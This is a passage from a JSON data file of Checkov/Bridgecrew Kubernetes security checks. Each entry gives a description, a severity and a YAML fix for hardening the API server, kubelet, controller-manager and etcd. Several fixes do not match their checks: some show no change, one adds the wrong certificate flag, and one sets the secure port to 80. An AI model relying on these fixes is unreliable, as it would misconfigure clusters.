        "description": "Image pull policy is not set to Always\nDescription\nThe Image Pull Policy of a container is set using the imagePullPolicy. The imagePullPolicy and the tag of the image are triggered when the kubelet attempts to pull the specified image. When the imagePullPolicy is set to Always, you ensure the latest version of the image is deployed every time the pod is started. Avoid using the :latest tag when deploying containers in production, it is harder to track which version of the image is running and more difficult to roll back correctly.\nFix - Buildtime \nKubernetes\nResource: Container\nArgument: imagePullPolicy (Optional)\nDefines for the kubelet when he should attempt to pull the specified image.\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  name: <name>\nspec:\n  containers:\n  - name: <container name>\n+   imagePullPolicy: Always\n",
        "severity": "LOW"
    },
    "CKV_K8S_70": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-token-auth-file-parameter-is-not-set",
        "description": "The --token-auth-file argument is Set\nDescription\nDo not use token based authentication. The token-based authentication utilizes static tokens to authenticate requests to the apiserver. The tokens are stored in clear-text in a file on the apiserver, and cannot be revoked or rotated without restarting the apiserver. Hence, do not use static token-based authentication.\nFix - Buildtime \nKubernetes\n\nKind Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n    - kube-apiserver\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    livenessProbe:\n      failureThreshold: 8\n      httpGet:\n        host: 127.0.0.1\n        path: /healthz\n        port: 6443\n        scheme: HTTPS\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    name: kube-apiserver\n    resources:\n      requests:\n        cpu: 250m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/\n      name: k8s\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: certs\n    - mountPath: /etc/pki\n      name: pki\n  hostNetwork: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes\n    name: k8s\n  - hostPath:\n      path: /etc/ssl/certs\n    name: certs\n  - hostPath:\n      path: /etc/pki\n    name: pki\n",
        "severity": "LOW"
    },
    "CKV_K8S_71": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-https-argument-is-set-to-true",
        "description": "The --kubelet-https argument is not set to True\nDescription\nUse https for kubelet connections. Connections from apiserver to kubelets could potentially carry sensitive data such as secrets and keys. It is thus important to use in-transit encryption for any communication between the apiserver and kubelets.\nFix - Buildtime \nKubernetes\n\nKind Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --kubelet-https=true\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "CRITICAL"
    },
    "CKV_K8S_72": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-client-certificate-and-kubelet-client-key-arguments-are-set-as-appropriate",
        "description": "The --kubelet-client-certificate and --kubelet-client-key arguments are not set appropriately\nDescription\nEnable certificate based kubelet authentication. The apiserver, by default, does not authenticate itself to the kubelet's HTTPS endpoints. The requests from the apiserver are treated anonymously. You should set up certificate- based kubelet authentication to ensure that the apiserver authenticates itself to kubelets when submitting requests.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --kubelet-client-certificate=/path/to/cert\n+   - --kubelet-client-key=/path/to/key\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "HIGH"
    },
    "CKV_K8S_80": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-alwayspullimages-is-set",
        "description": "The admission control plugin AlwaysPullImages is not set\nDescription\nAlways pull images.\nSetting admission control policy to AlwaysPullImages forces every new pod to pull the required images every time. In a multi-tenant cluster users can be assured that their private images can only be used by those who have the credentials to pull them. Without this admission control policy, once an image has been pulled to a node, any pod from any user can use it simply by knowing the image\u2019s name, without any authorization check against the image ownership. When this plug-in is enabled, images are always pulled prior to starting containers, which means valid credentials are required.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --enable-admission-plugins=AlwaysPullImages\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_81": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-securitycontextdeny-is-set-if-podsecuritypolicy-is-not-used",
        "description": "The admission control plugin SecurityContextDeny is set if PodSecurityPolicy is used\nDescription\nThe SecurityContextDeny admission controller can be used to deny pods which make use of some SecurityContext fields which could allow for privilege escalation in the cluster. This should be used where PodSecurityPolicy is not in place within the cluster.\nSecurityContextDeny can be used to provide a layer of security for clusters which do not have PodSecurityPolicies enabled.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --enable-admission-plugins=SecurityContextDeny\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_82": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-serviceaccount-is-set",
        "description": "The admission control plugin ServiceAccount is not set\nDescription\nAutomate service accounts management. When you create a pod, if you do not specify a service account, it is automatically assigned the default service account in the same namespace. You should create your own service account and let the API server manage its security tokens.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --enable-admission-plugins=ServiceAccount\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_85": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-noderestriction-is-set",
        "description": "The admission control plugin NodeRestriction is not set\nDescription\nLimit the Node and Pod objects that a kubelet could modify.\nUsing the NodeRestriction plug-in ensures that the kubelet is restricted to the Node and Pod objects that it could modify as defined. Such kubelets will only be allowed to modify their own Node API object, and only modify Pod API objects that are bound to their node.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --enable-admission-plugins=NodeRestriction\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_86": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-insecure-bind-address-argument-is-not-set",
        "description": "The --insecure-bind-address argument is set\nDescription\nDo not bind the insecure API service.\nIf you bind the apiserver to an insecure address, basically anyone who could connect to it over the insecure port, would have unauthenticated and unencrypted access to your master node. The apiserver doesn't do any authentication checking for insecure binds and traffic to the Insecure API port is not encrpyted, allowing attackers to potentially read sensitive data in transit.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --bind-address=192.168.1.1\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "HIGH"
    },
    "CKV_K8S_68": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-anonymous-auth-argument-is-set-to-false-1",
        "description": "The --anonymous-auth argument is not set to False\nDescription\nDisable anonymous requests to the API server. When enabled, requests that are not rejected by other configured authentication methods are treated as anonymous requests. These requests are then served by the API server. You should rely on authentication to authorize access and disallow anonymous requests.\nIf you are using RBAC authorization, it is generally considered reasonable to allow anonymous access to the API Server for health checks and discovery purposes, and hence this recommendation is not scored. However, you should consider whether anonymous discovery is an acceptable risk for your purposes.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --anonymous-auth=false\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_88": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-insecure-port-argument-is-set-to-0",
        "description": "The --insecure-port argument is not set to 0  \nDescription\nDo not bind to insecure port. Setting up the apiserver to serve on an insecure port would allow unauthenticated and unencrypted access to your master node. This would allow attackers who could access this port, to easily take control of the cluster.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --insecure-port=0\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "HIGH"
    },
    "CKV_K8S_89": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-secure-port-argument-is-not-set-to-0",
        "description": "The --secure-port argument is set to 0\nDescription\nDo not disable the secure port. The secure port is used to serve https with authentication and authorization. If you disable it, no https traffic is served and all traffic is served unencrypted.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --secure-port=80\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_90": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-profiling-argument-is-set-to-false-2",
        "description": "The --profiling argument is not set to False\nDescription\nDisable profiling, if not needed.Profiling allows for the identification of specific performance bottlenecks. It generates a significant amount of program data that could potentially be exploited to uncover system and program details. If you are not experiencing any bottlenecks and do not need the profiler for troubleshooting purposes, it is recommended to turn it off to reduce the potential attack surface.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --profiling=false\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_69": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-basic-auth-file-argument-is-not-set",
        "description": "The --basic-auth-file argument is Set\nDescription\nDo not use basic authentication. Basic authentication uses plaintext credentials for authentication. Currently, the basic authentication credentials last indefinitely, and the password cannot be changed without restarting the API server. The basic authentication is currently supported for convenience. Hence, basic authentication should not be used.\nFix - Buildtime \nKubernetes\n\nKind Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n    - kube-apiserver\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    livenessProbe:\n      failureThreshold: 8\n      httpGet:\n        host: 127.0.0.1\n        path: /healthz\n        port: 6443\n        scheme: HTTPS\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    name: kube-apiserver\n    resources:\n      requests:\n        cpu: 250m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/\n      name: k8s\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: certs\n    - mountPath: /etc/pki\n      name: pki\n  hostNetwork: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes\n    name: k8s\n  - hostPath:\n      path: /etc/ssl/certs\n    name: certs\n  - hostPath:\n      path: /etc/pki\n    name: pki\n",
        "severity": "LOW"
    },
    "CKV_K8S_73": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-certificate-authority-argument-is-set-as-appropriate",
        "description": "The --kubelet-certificate-authority argument is not set appropriately\nDescription\nVerify kubelet's certificate before establishing connection.The connections from the apiserver to the kubelet are used for fetching logs for pods, attaching (through kubectl) to running pods, and using the kubelet\u2019s port-forwarding functionality. These connections terminate at the kubelet\u2019s HTTPS endpoint. By default, the apiserver does not verify the kubelet\u2019s serving certificate, which makes the connection subject to man-in-the-middle attacks, and unsafe to run over untrusted and/or public networks.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --kubelet-certificate-authority=ca.file\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "HIGH"
    },
    "CKV_K8S_74": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-is-not-set-to-alwaysallow-1",
        "description": "The --authorization-mode argument is set to AlwaysAllow \nDescription\nDo not always authorize all requests. The API Server, can be configured to allow all requests. This mode should not be used on any production cluster.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --authorization-mode=RBAC,node\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_75": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-includes-node",
        "description": "The --authorization-mode argument does not include node\nDescription\nRestrict kubelet nodes to reading only objects associated with them. The Node authorization mode only allows kubelets to read Secret, ConfigMap, PersistentVolume, and PersistentVolumeClaim objects associated with their nodes.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+    - kube-apiserver\n+    - --authorization-mode=RBAC,Node\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_96": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-service-account-lookup-argument-is-set-to-true",
        "description": "The --service-account-lookup argument is not set to True  \nDescription\nValidate service account before validating token.\nIf --service-account-lookup is not enabled, the apiserver only verifies that the authentication token is valid, and does not validate that the service account token mentioned in the request is actually present in etcd. This allows using a service account token even after the corresponding service account is deleted. This is an example of time of check to time of use security issue.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --service-account-lookup=true\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n   ...\n",
        "severity": "HIGH"
    },
    "CKV_K8S_77": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-includes-rbac",
        "description": "The --authorization-mode argument does not include RBAC\nDescription\nTurn on Role Based Access Control.\nRole Based Access Control (RBAC) allows fine-grained control over the operations that different entities can perform on different objects in the cluster. It is recommended to use the RBAC authorization mode.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --authorization-mode=RBAC,Node\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_78": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-eventratelimit-is-set",
        "description": "The admission control plugin EventRateLimit is not set\nDescription\nLimit the rate at which the API server accepts requests.\nUsing EventRateLimit admission control enforces a limit on the number of events that the API Server will accept in a given time slice. A misbehaving workload could overwhelm and DoS the API Server, making it unavailable. This particularly applies to a multi-tenant cluster, where there might be a small percentage of misbehaving tenants which could have a significant impact on the performance of the cluster overall. Hence, it is recommended to limit the rate of events that the API server will accept.\nNote: This is an Alpha feature in the Kubernetes 1.15 release.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: apiserver.config.k8s.io/v1\nkind: AdmissionConfiguration\nmetadata:\n  name: \"admission-configuration-passed\"\nplugins:\n  - name: ValidatingAdmissionWebhook\n    configuration:\n      apiVersion: apiserver.config.k8s.io/v1\n      kind: WebhookAdmissionConfiguration\n      kubeConfigFile: \"<path-to-kubeconfig-file>\"\n+ - name: EventRateLimit\n+   path: eventconfig.yaml\n  - name: MutatingAdmissionWebhook\n    configuration:\n      apiVersion: apiserver.config.k8s.io/v1\n      kind: WebhookAdmissionConfiguration\n      kubeConfigFile: \"<path-to-kubeconfig-file>\"\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_79": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-alwaysadmit-is-not-set",
        "description": "The admission control plugin AlwaysAdmit is set\nDescription\nDo not allow all requests. Setting admission control plugin AlwaysAdmit allows all requests and do not filter any requests.\nThe AlwaysAdmit admission controller was deprecated in Kubernetes v1.13. Its behavior was equivalent to turning off all admission controllers.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver-passed\n  namespace: kube-system\nspec:\n  containers:\n    - command:\n        - kube-apiserver\n        - --enable-admission-plugins=other\n      image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n      livenessProbe:\n        failureThreshold: 8\n        httpGet:\n          host: 127.0.0.1\n          path: /healthz\n          port: 6443\n          scheme: HTTPS\n        initialDelaySeconds: 15\n        timeoutSeconds: 15\n      name: kube-apiserver\n      resources:\n        requests:\n          cpu: 250m\n      volumeMounts:\n        - mountPath: /etc/kubernetes/\n          name: k8s\n          readOnly: true\n        - mountPath: /etc/ssl/certs\n          name: certs\n        - mountPath: /etc/pki\n          name: pki\n  hostNetwork: true\n  volumes:\n    - hostPath:\n        path: /etc/kubernetes\n      name: k8s\n    - hostPath:\n        path: /etc/ssl/certs\n      name: certs\n    - hostPath:\n        path: /etc/pki\n      name: pki\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_97": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-service-account-key-file-argument-is-set-as-appropriate",
        "description": "The --service-account-key-file argument is not set appropriately  \nDescription\nExplicitly set a service account public key file for service accounts on the apiserver.\nBy default, if no --service-account-key-file is specified to the apiserver, it uses the private key from the TLS serving certificate to verify service account tokens. To ensure that the keys for service account tokens could be rotated as needed, a separate public/private key pair should be used for signing service account tokens. Hence, the public key should be specified to the apiserver with --service-account-key-file.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --service-account-key-file=/keys/key.pem\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_105": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-api-server-only-makes-use-of-strong-cryptographic-ciphers",
        "description": "The API server does not make use of strong cryptographic ciphers\nDescription\nEnsure that the API server is configured to only use strong cryptographic ciphers. TLS ciphers have had a number of known vulnerabilities and weaknesses, which can reduce the protection provided by them. By default Kubernetes supports a number of TLS ciphersuites including some that have security concerns, weakening the protection provided.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --tls-cipher-suites=TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    livenessProbe:\n      failureThreshold: 8\n      httpGet:\n        host: 127.0.0.1\n        path: /healthz\n        port: 6443\n        scheme: HTTPS\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    name: kube-apiserver-should-pass\n    resources:\n      requests:\n        cpu: 250m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/\n      name: k8s\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: certs\n    - mountPath: /etc/pki\n      name: pki\n  hostNetwork: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes\n    name: k8s\n  - hostPath:\n      path: /etc/ssl/certs\n    name: certs\n  - hostPath:\n      path: /etc/pki\n    name: pki\n",
        "severity": "CRITICAL"
    },
    "CKV_K8S_111": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-root-ca-file-argument-is-set-as-appropriate",
        "description": "The --root-ca-file argument for controller managers is not set appropriately\nDescription\nAllow pods to verify the API server's serving certificate before establishing connections.\nProcesses running within pods that need to contact the API server must verify the API server's serving certificate. Failing to do so could be a subject to man-in-the-middle attacks.\nProviding the root certificate for the API server's serving certificate to the controller manager with the --root-ca-file argument allows the controller manager to inject the trusted bundle into pods so that they can verify TLS connections to the API server.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\n  kind: Pod\n  metadata:\n    creationTimestamp: null\n    labels:\n      component: kube-controller-manager\n      tier: control-plane\n    name: kube-controller-manager\n    namespace: kube-system\n  spec:\n    containers:\n    - command:\n      - kube-controller-manager\n+     -  --root-ca-file=private.pem\n      image: gcr.io/google_containers/kube-controller-manager-amd64:v1.6.0\n",
        "severity": "HIGH"
    },
    "CKV_K8S_112": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-rotatekubeletservercertificate-argument-is-set-to-true-for-controller-manager",
        "description": "The RotateKubeletServerCertificate argument for controller managers is not set to True \nDescription\nEnable kubelet server certificate rotation. RotateKubeletServerCertificate causes the kubelet to both request a serving certificate after bootstrapping its client credentials and rotate the certificate as its existing credentials expire. This automated periodic rotation ensures that the there are no downtimes due to expired certificates and thus addressing availability in the CIA security triad.\n\ud83d\udcd8NoteThis recommendation only applies if you let kubelets get their certificates from the API server. In case your kubelet certificates come from an outside authority/tool (e.g. Vault) then you need to take care of rotation yourself.\nFix - Buildtime \nKubernetes\nKind: Pod\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kubelet\n    tier: control-plane\n  name: kubelet\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kubelet\n+   - --feature-gates=RotateKubeletServerCertificate=true\n    image: gcr.io/google_containers/kubelet-amd64:v1.6.0\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_117": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-client-cert-auth-argument-is-set-to-true",
        "description": "The --client-cert-auth argument is not set to True\nDescription\nEnable client authentication on etcd service. etcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should not be available to unauthenticated clients. You should enable the client authentication via valid certificates to secure the access to the etcd service.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  annotations:\n    scheduler.alpha.kubernetes.io/critical-pod: \"\"\n  creationTimestamp: null\n  labels:\n    component: etcd\n    tier: control-plane\n  name: etcd\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - etcd\n+   - --client-cert-auth=true\n    image: k8s.gcr.io/etcd-amd64:3.2.18\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_108": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-use-service-account-credentials-argument-is-set-to-true",
        "description": "The --use-service-account-credentials argument for controller managers is not set to True\nDescription\nUse individual service account credentials for each controller. The controller manager creates a service account per controller in the kube-system namespace, generates a credential for it, and builds a dedicated API client with that service account credential for each controller loop to use. Setting the --use-service-account- credentials to true runs each control loop within the controller manager using a separate service account credential. When used in combination with RBAC, this ensures that the control loops run with the minimum permissions required to perform their intended tasks.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\n  kind: Pod\n  metadata:\n    creationTimestamp: null\n    labels:\n      component: kube-controller-manager\n      tier: control-plane\n    name: kube-controller-manager\n    namespace: kube-system\n  spec:\n    containers:\n    - command:\n      - kube-controller-manager\n+     -  --use-service-account-credentials=true\n      image: gcr.io/google_containers/kube-controller-manager-amd64:v1.6.0\n",
        "severity": "HIGH"
    },
    "CKV_K8S_138": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-anonymous-auth-argument-is-set-to-false",
        "description": "The --anonymous-auth argument is not set to False\nDescription\nDisable anonymous requests to the Kubelet server. When enabled, requests that are not rejected by other configured authentication methods are treated as anonymous requests. These requests are then served by the Kubelet server. You should rely on authentication to authorize access and disallow anonymous requests.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kubelet\n    tier: control-plane\n  name: kubelet\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+    - kubelet\n+    - --anonymous-auth=false\n    image: gcr.io/google_containers/kubelet-amd64:v1.6.0\n    ...\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_139": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-is-not-set-to-alwaysallow",
        "description": "The --authorization-mode argument is set to AlwaysAllow\nDescription\nDo not allow all requests. Enable explicit authorization. Kubelets, by default, allow all authenticated requests (even anonymous ones) without needing explicit authorization checks from the apiserver. You should restrict this behavior and only allow explicitly authorized requests.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kubelet\n    tier: control-plane\n  name: kubelet\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kubelet\n+   - --authorization-mode=RBAC,node\n    image: gcr.io/google_containers/kubelet-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_140": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-client-ca-file-argument-is-set-as-appropriate-scored",
        "description": "The --client-ca-file argument for API Servers is not set appropriately \nDescription\nEnable Kubelet authentication using certificates. The connections from the apiserver to the kubelet are used for fetching logs for pods, attaching (through kubectl) to running pods, and using the kubelet\u2019s port-forwarding functionality. These connections terminate at the kubelet\u2019s HTTPS endpoint. By default, the apiserver does not verify the kubelet\u2019s serving certificate, which makes the connection subject to man-in-the-middle attacks, and unsafe to run over untrusted and/or public networks. Enabling Kubelet certificate authentication ensures that the apiserver could authenticate the Kubelet before submitting any requests.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kubelet\n    tier: control-plane\n  name: kubelet\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kubelet\n+   - --root-ca-file=test.pem\n    image: gcr.io/google_containers/kubelet-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_83": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-namespacelifecycle-is-set",
